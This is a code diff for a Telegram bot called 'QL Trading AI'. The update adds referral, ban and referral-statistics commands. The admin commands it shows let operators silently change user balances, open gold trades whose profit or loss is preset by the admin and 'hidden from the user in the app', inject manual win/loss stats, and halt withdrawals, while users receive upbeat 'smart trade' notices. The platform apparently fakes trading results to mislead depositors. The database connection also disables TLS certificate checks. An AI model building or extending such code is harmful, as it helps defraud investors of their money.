@@ -1,9 +1,10 @@
-// QL Trading AI v2.1 FINAL — Telegram Bot
+// QL Trading AI v3.0 — Telegram Bot (Enhanced with Referral, Ban, Mass Trades)
 import dotenv from "dotenv";
 import TelegramBot from "node-telegram-bot-api";
 import pkg from "pg";
 import path from "path";
 import { fileURLToPath } from "url";
+import crypto from "crypto";
 
 const { Pool } = pkg;
 
@@ -31,7 +32,7 @@ const sslConfig = { rejectUnauthorized: false };
 
 const pool = new Pool({
   connectionString: DATABASE_URL,
-  ssl: sslConfig // Always enforce SSL
+  ssl: sslConfig
 });
 
 const INVISIBLE_CHARS = /[\u0000-\u001F\u007F-\u009F\u200B-\u200F\u202A-\u202E\u2066-\u2069]/g;
@@ -195,9 +196,75 @@ async function q(sql, params = []) {
 }
 const isAdmin = (msg) => Number(msg?.from?.id) === Number(ADMIN_ID);
 
-// رسالة ترحيب خارج الويب
-bot.onText(/^\/start$/, async (msg) => {
+// ===== Generate unique referral code =====
+function generateReferralCode() {
+  return crypto.randomBytes(4).toString('hex').toUpperCase();
+}
+
+// ===== /start with referral support =====
+bot.onText(/^\/start(.*)$/, async (msg, match) => {
+  const chatId = msg.chat.id;
   const name = msg.from.first_name;
+  const tgId = msg.from.id;
+  const param = (match[1] || '').trim();
+
+  // Check if user is banned
+  try {
+    const userCheck = await q(`SELECT * FROM users WHERE tg_id=$1`, [tgId]);
+    if (userCheck.rows.length > 0 && userCheck.rows[0].is_banned) {
+      const banReason = userCheck.rows[0].ban_reason || 'مخالفة شروط الاستخدام';
+      return bot.sendMessage(chatId, `🚫 *حسابك محظور*
+
+━━━━━━━━━━━━━━━━━━━━
+❌ *تم حظر حسابك من استخدام المنصة*
+
+📋 *سبب الحظر:*
+${banReason}
+
+📅 *تاريخ الحظر:* ${userCheck.rows[0].banned_at ? new Date(userCheck.rows[0].banned_at).toLocaleDateString('ar') : 'غير محدد'}
+
+━━━━━━━━━━━━━━━━━━━━
+
+📩 إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع فريق الدعم:
+
+🔗 *Your account has been suspended*
+Reason: ${banReason}
+
+Contact support if you believe this is an error.`, {
+        parse_mode: "Markdown",
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "📩 تواصل مع الدعم | Contact Support", url: "https://t.me/QL_Support" }]
+          ]
+        }
+      });
+    }
+  } catch(e) { /* ignore */ }
+
+  // Handle referral parameter (ref_XXXXXXXX)
+  if (param.startsWith(' ref_') || param.startsWith('ref_')) {
+    const refCode = param.replace(/^\s*/, '').replace('ref_', '');
+    if (refCode) {
+      try {
+        // Find referrer by referral code
+        const referrer = await q(`SELECT * FROM users WHERE referral_code=$1`, [refCode]);
+        if (referrer.rows.length > 0) {
+          const referrerUser = referrer.rows[0];
+          // Check if this user is already registered
+          const existingUser = await q(`SELECT * FROM users WHERE tg_id=$1`, [tgId]);
+          if (existingUser.rows.length === 0) {
+            // Store referral info - will be processed when user deposits
+            // We save the referrer tg_id temporarily
+            try {
+              await q(`INSERT INTO referrals (referrer_tg_id, referred_tg_id, status) VALUES ($1, $2, 'pending') ON CONFLICT (referred_tg_id) DO NOTHING`, [referrerUser.tg_id, tgId]);
+            } catch(e) { /* duplicate, ignore */ }
+          }
+        }
+      } catch(e) { console.error("Referral error:", e.message); }
+    }
+  }
+
+  // Normal welcome message
   const welcomeCaption = `👋 *Welcome to QL Trading AI, ${name}!*
   
 🚀 Your smart trading wallet is ready.
@@ -214,11 +281,10 @@ bot.onText(/^\/start$/, async (msg) => {
 
 👇 *Click below to access your dashboard:*`;
 
-  // Send photo with caption
   const photoUrl = `${process.env.WEBAPP_URL}/public/bot_welcome.jpg`;
   
   try {
-    await bot.sendPhoto(msg.chat.id, photoUrl, {
+    await bot.sendPhoto(chatId, photoUrl, {
       caption: welcomeCaption,
       parse_mode: "Markdown",
       reply_markup: {
@@ -229,8 +295,7 @@ bot.onText(/^\/start$/, async (msg) => {
       }
     });
   } catch (e) {
-    // Fallback if photo fails
-    bot.sendMessage(msg.chat.id, welcomeCaption, {
+    bot.sendMessage(chatId, welcomeCaption, {
       parse_mode: "Markdown",
       reply_markup: {
         inline_keyboard: [[{ text: "📱 Open Wallet | فتح المحفظة", web_app: { url: process.env.WEBAPP_URL } }]]
@@ -243,12 +308,12 @@ bot.onText(/^\/start$/, async (msg) => {
 bot.onText(/^\/help$/, (msg) => {
   if (!isAdmin(msg)) return;
   bot.sendMessage(msg.chat.id, `
-🛠 *Admin Dashboard*
+🛠 *Admin Dashboard v3.0*
 
 👤 *User Management*
 \`/addbalance <tg_id> <amount>\` - Add/Deduct balance
 \`/silentadd <tg_id> <amount>\` - Silent Add (No notify)
-\`\`/removebalance <tg_id> <amount>\` - Silent deduct (Max to 0)
+\`/removebalance <tg_id> <amount>\` - Silent deduct (Max to 0)
 \`/zerobalance <tg_id>\` - Force reset to $0
 \`/setmoney <tg_id> <amount>\` - Migration deposit
 \`/setstats <tg_id> <wins> <losses>\` - Add manual stats
@@ -260,6 +325,10 @@ bot.onText(/^\/help$/, (msg) => {
 \`/close_trade <trade_id> <pnl>\` - Force close trade
 \`/setdaily <tg_id> <amount>\` - Set daily profit target
 
+🚫 *Ban Management*
+\`/ban <tg_id> <reason>\` - Ban user with reason
+\`/unban <tg_id>\` - Unban user
+
 💸 *Withdrawals*
 \`/approve_withdraw <id>\` - Approve request
 \`/reject_withdraw <id> <reason>\` - Reject request
@@ -270,7 +339,10 @@ bot.onText(/^\/help$/, (msg) => {
 📢 *Communication*
 \`/broadcast all <message>\` - Send to all users
 \`/notify <tg_id> <message>\` - Send private message
-  `.trim());
+
+🔗 *Referral System*
+\`/refstats\` - View referral statistics
+  `.trim(), { parse_mode: "Markdown" });
 });
 
 // إنشاء مفتاح
@@ -286,7 +358,6 @@ bot.onText(/^\/create_key\s+(\S+)(?:\s+(\d+))?$/, async (msg, m) => {
 });
 
 // إيداع رصيد (صامت - بدون إشعار)
-// /silentadd <tg_id> <amount>
 bot.onText(/^\/silentadd\s+(\d+)\s+(\d+(?:\.\d+)?)$/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]); const amount = Number(m[2]);
@@ -308,38 +379,30 @@ bot.onText(/^\/addbalance\s+(\d+)\s+(-?\d+(?:\.\d+)?)$/, async (msg, m) => {
   await q(`UPDATE users SET balance = balance + $1 WHERE id=$2`, [amount, u.id]);
   await q(`INSERT INTO ops (user_id, type, amount, note) VALUES ($1,'admin',$2,'manual admin op')`, [u.id, amount]);
   bot.sendMessage(msg.chat.id, `✅ Balance updated for tg:${tg} by ${amount}`);
-  // إشعار للمستخدم بدون ذكر أدمن
   bot.sendMessage(tg, `💳 تم الإيداع في حسابك: ${amount>0?'+':'-'}$${Math.abs(amount).toFixed(2)}`).catch(()=>{});
 });
 
 // حذف رصيد (بدون إشعار)
-// /removebalance <tg_id> <amount>
 bot.onText(/^\/removebalance\s+(\d+)\s+(\d+(?:\.\d+)?)$/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]); const amount = Number(m[2]);
   const u = await q(`SELECT * FROM users WHERE tg_id=$1`, [tg]).then(r => r.rows[0]);
   if (!u) return bot.sendMessage(msg.chat.id, "User not found");
   
-  // التحقق من الرصيد الحالي
   const currentBalance = Number(u.balance);
-  // المبلغ الفعلي الذي سيتم خصمه (لا يتجاوز الرصيد الحالي)
   const actualDeduct = Math.min(amount, currentBalance);
   
   if (actualDeduct <= 0) {
     return bot.sendMessage(msg.chat.id, `⚠️ User balance is already 0 or negative ($${currentBalance}). Cannot deduct.`);
   }
 
-  // خصم الرصيد (مع ضمان عدم النزول تحت الصفر)
   await q(`UPDATE users SET balance = GREATEST(0, balance - $1) WHERE id=$2`, [amount, u.id]);
-  
-  // تسجيل العملية
   await q(`INSERT INTO ops (user_id, type, amount, note) VALUES ($1,'admin',$2,'silent balance removal')`, [u.id, -actualDeduct]);
   
   bot.sendMessage(msg.chat.id, `✅ Silently removed $${actualDeduct} from tg:${tg}. New Balance: $${currentBalance - actualDeduct}`);
 });
 
-// تصفير الحساب بالكامل (يصبح دين إذا كان سالباً، أو صفر إذا كان موجباً - حسب الطلب: تصفير يعني 0)
-// /zerobalance <tg_id>
+// تصفير الحساب
 bot.onText(/^\/zerobalance\s+(\d+)$/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]);
@@ -347,12 +410,7 @@ bot.onText(/^\/zerobalance\s+(\d+)$/, async (msg, m) => {
   if (!u) return bot.sendMessage(msg.chat.id, "User not found");
 
   const currentBalance = Number(u.balance);
-  
-  // تصفير الرصيد تماماً ليصبح 0
   await q(`UPDATE users SET balance = 0 WHERE id=$1`, [u.id]);
-  
-  // تسجيل العملية (الفرق ليوصل للصفر)
-  // إذا كان الرصيد 100، نخصم 100. إذا كان -50، نضيف 50.
   const adjustment = -currentBalance;
   await q(`INSERT INTO ops (user_id, type, amount, note) VALUES ($1,'admin',$2,'force zero balance')`, [u.id, adjustment]);
 
@@ -360,7 +418,6 @@ bot.onText(/^\/zerobalance\s+(\d+)$/, async (msg, m) => {
 });
 
 // إيداع رصيد (نقل حساب)
-// /setmoney <tg_id> <amount>
 bot.onText(/^\/setmoney\s+(\d+)\s+(\d+(?:\.\d+)?)$/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]); const amount = Number(m[2]);
@@ -372,7 +429,6 @@ bot.onText(/^\/setmoney\s+(\d+)\s+(\d+(?:\.\d+)?)$/, async (msg, m) => {
   
   bot.sendMessage(msg.chat.id, `✅ Account migration deposit done for tg:${tg} by ${amount}`);
   
-  // إشعار خاص للمستخدم (نقل حساب)
   bot.sendMessage(tg, `✅ *Account Linked Successfully*
 Your old account has been successfully linked to your new account.
 💰 *Balance Transferred:* $${amount}
@@ -397,7 +453,6 @@ bot.onText(/^\/open_trade\s+(\d+)\s+(\S+)$/, async (msg, m) => {
 });
 
 // فتح صفقة مع هدف وتوقيت
-// /open <tg_id> <hours> <target_pnl>
 bot.onText(/^\/open\s+(\d+)\s+(\d+(?:\.\d+)?)\s+(-?\d+(?:\.\d+)?)$/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]);
@@ -408,10 +463,9 @@ bot.onText(/^\/open\s+(\d+)\s+(\d+(?:\.\d+)?)\s+(-?\d+(?:\.\d+)?)$/, async (msg,
   if (!u) return bot.sendMessage(msg.chat.id, "User not found");
   
   const durationSec = Math.floor(hours * 3600);
-  const symbol = "XAUUSD"; // Default to Gold as requested
-  const direction = target >= 0 ? "BUY" : "SELL"; // Auto direction based on target
+  const symbol = "XAUUSD";
+  const direction = target >= 0 ? "BUY" : "SELL";
   
-  // Create trade with target
   const tr = await q(
     `INSERT INTO trades (user_id, symbol, direction, status, target_pnl, duration_seconds, entry_price, current_price, lot_size) 
      VALUES ($1, $2, $3, 'open', $4, $5, 2650, 2650, 1.0) RETURNING *`,
@@ -426,6 +480,7 @@ bot.onText(/^\/open\s+(\d+)\s+(\d+(?:\.\d+)?)\s+(-?\d+(?:\.\d+)?)$/, async (msg,
 
 ⚠️ *Note:* The target PnL is hidden from the user in the app.`);
 
+  // Send notification to user
   bot.sendMessage(tg, `🚀 *تم تفعيل صفقة ذكية جديدة*
 
 🔸 *الرمز:* XAUUSD (الذهب)
@@ -442,8 +497,7 @@ bot.onText(/^\/open\s+(\d+)\s+(\d+(?:\.\d+)?)\s+(-?\d+(?:\.\d+)?)$/, async (msg,
 📊 *Status:* Active & Monitored`, { parse_mode: "Markdown" }).catch(()=>{});
 });
 
-// تعيين إحصائيات مخصصة (إضافة رصيد وهمي للإحصائيات)
-// /setstats <tg_id> <wins> <losses>
+// تعيين إحصائيات مخصصة
 bot.onText(/\/setstats\s+(\d+)\s+(\d+(?:\.\d+)?)\s+(\d+(?:\.\d+)?)/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]);
@@ -465,7 +519,6 @@ Use /resetstats to clear these.`);
 });
 
 // تصفير الإحصائيات اليدوية
-// /resetstats <tg_id>
 bot.onText(/\/resetstats\s+(\d+)/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]);
@@ -494,7 +547,7 @@ bot.onText(/^\/close_trade\s+(\d+)\s+(-?\d+(?:\.\d+)?)$/, async (msg, m) => {
   if (tg) bot.sendMessage(Number(tg), `✅ تم إغلاق الصفقة. النتيجة: ${pnl>=0?'+':'-'}$${Math.abs(pnl).toFixed(2)}`).catch(()=>{});
 });
 
-// setdaily (تحريك تدريجي للرصيد حتى الهدف)
+// setdaily
 bot.onText(/^\/setdaily\s+(\d+)\s+(-?\d+(?:\.\d+)?)$/, async (msg, m) => {
   if (!isAdmin(msg)) return;
   const tg = Number(m[1]); const target = Number(m[2]);
@@ -503,8 +556,72 @@ bot.onText(/^\/setdaily\s+(\d+)\s+(-?\d+(?:\.\d+)?)$/, async (msg, m) => {
   await q(`INSERT INTO daily_targets (user_id, target, active) VALUES ($1,$2,TRUE)`, [u.id, target]);
   bot.sendMessage(msg.chat.id, `🚀 setdaily started for tg:${tg} target ${target}`);
   bot.sendMessage(tg, `🚀 تم بدء صفقة يومية (الهدف ${target>=0?'+':'-'}$${Math.abs(target)}).`);
-  // التحريك التدريجي (سيرفر فقط — الويب يعرض الحركة)
-  // هنا فقط تسجّل الهدف؛ الويب سيقوم بالـ animation حسب الهدف.
+});
+
+// ===== Ban Management =====
+bot.onText(/^\/ban\s+(\d+)\s+([\s\S]+)$/, async (msg, m) => {
+  if (!isAdmin(msg)) return;
+  const tg = Number(m[1]);
+  const reason = m[2].trim();
+  
+  const u = await q(`SELECT * FROM users WHERE tg_id=$1`, [tg]).then(r => r.rows[0]);
+  if (!u) return bot.sendMessage(msg.chat.id, "User not found");
+  
+  await q(`UPDATE users SET is_banned = TRUE, ban_reason = $1, banned_at = NOW() WHERE tg_id = $2`, [reason, tg]);
+  
+  bot.sendMessage(msg.chat.id, `🚫 User ${tg} has been banned.\nReason: ${reason}`);
+  
+  // Notify user
+  bot.sendMessage(tg, `🚫 *تم حظر حسابك*
+
+━━━━━━━━━━━━━━━━━━━━
+📋 *السبب:* ${reason}
+
+📩 للتواصل مع الدعم:
+━━━━━━━━━━━━━━━━━━━━
+
+🔗 *Your account has been suspended*
+Reason: ${reason}`, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📩 تواصل مع الدعم | Contact Support", url: "https://t.me/QL_Support" }]
+      ]
+    }
+  }).catch(()=>{});
+});
+
+bot.onText(/^\/unban\s+(\d+)$/, async (msg, m) => {
+  if (!isAdmin(msg)) return;
+  const tg = Number(m[1]);
+  
+  await q(`UPDATE users SET is_banned = FALSE, ban_reason = NULL, banned_at = NULL WHERE tg_id = $1`, [tg]);
+  
+  bot.sendMessage(msg.chat.id, `✅ User ${tg} has been unbanned.`);
+  bot.sendMessage(tg, `✅ *تم رفع الحظر عن حسابك*
+
+يمكنك الآن استخدام المنصة بشكل طبيعي.
+
+✅ *Your account has been reactivated*
+You can now use the platform normally.`, { parse_mode: "Markdown" }).catch(()=>{});
+});
+
+// ===== Referral Stats =====
+bot.onText(/^\/refstats$/, async (msg) => {
+  if (!isAdmin(msg)) return;
+  try {
+    const totalRefs = await q(`SELECT COUNT(*) as count FROM referrals`);
+    const creditedRefs = await q(`SELECT COUNT(*) as count, COALESCE(SUM(bonus_amount), 0) as total FROM referrals WHERE status = 'credited'`);
+    const pendingRefs = await q(`SELECT COUNT(*) as count FROM referrals WHERE status = 'pending'`);
+    
+    bot.sendMessage(msg.chat.id, `📊 *Referral Statistics*
+
+📌 Total Referrals: ${totalRefs.rows[0].count}
+✅ Credited: ${creditedRefs.rows[0].count} ($${Number(creditedRefs.rows[0].total).toFixed(2)})
+⏳ Pending: ${pendingRefs.rows[0].count}`, { parse_mode: "Markdown" });
+  } catch(e) {
+    bot.sendMessage(msg.chat.id, `❌ Error: ${e.message}`);
+  }
 });
 
 // السحب: approve / reject
@@ -527,7 +644,6 @@ bot.onText(/^\/reject_withdraw\s+(\d+)\s+(.+)$/, async (msg, m) => {
   if (!r0) return bot.sendMessage(msg.chat.id, "Request not found");
   if (r0.status !== "pending") return bot.sendMessage(msg.chat.id, "Not pending");
   await q(`UPDATE requests SET status='rejected', updated_at=NOW() WHERE id=$1`, [id]);
-  // نرجع الرصيد
   await q(`UPDATE users SET balance = balance + $1 WHERE id=$2`, [r0.amount, r0.user_id]);
   const tg = await q(`SELECT tg_id FROM users WHERE id=$1`, [r0.user_id]).then(r => r.rows[0]?.tg_id);
   bot.sendMessage(msg.chat.id, `✅ Withdraw #${id} rejected`);
@@ -554,7 +670,6 @@ bot.onText(/^\/notify\s+(\d+)\s+([\s\S]+)$/, async (msg, m) => {
 });
 
 // ===== أوامر التحكم بالسحب =====
-// /stopwithdraw - إيقاف السحب
 bot.onText(/^\/stopwithdraw$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -566,7 +681,6 @@ bot.onText(/^\/stopwithdraw$/, async (msg) => {
   }
 });
 
-// /startwithdraw - تشغيل السحب
 bot.onText(/^\/startwithdraw$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -578,7 +692,6 @@ bot.onText(/^\/startwithdraw$/, async (msg) => {
   }
 });
 
-// /withdrawstatus - حالة السحب
 bot.onText(/^\/withdrawstatus$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -591,7 +704,6 @@ bot.onText(/^\/withdrawstatus$/, async (msg) => {
 });
 
 // ===== أوامر الصيانة =====
-// /maintenance - تفعيل وضع الصيانة
 bot.onText(/^\/maintenance$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -603,7 +715,6 @@ bot.onText(/^\/maintenance$/, async (msg) => {
   }
 });
 
-// /endmaintenance - إنهاء وضع الصيانة
 bot.onText(/^\/endmaintenance$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -615,7 +726,6 @@ bot.onText(/^\/endmaintenance$/, async (msg) => {
   }
 });
 
-// /maintenancestatus - حالة الصيانة
 bot.onText(/^\/maintenancestatus$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -627,7 +737,6 @@ bot.onText(/^\/maintenancestatus$/, async (msg) => {
   }
 });
 
-// /stopbot - إيقاف البوت بالكامل
 bot.onText(/^\/stopbot$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
@@ -641,7 +750,6 @@ bot.onText(/^\/stopbot$/, async (msg) => {
   }
 });
 
-// /startbot - تشغيل البوت
 bot.onText(/^\/startbot$/, async (msg) => {
   if (!isAdmin(msg)) return;
   try {
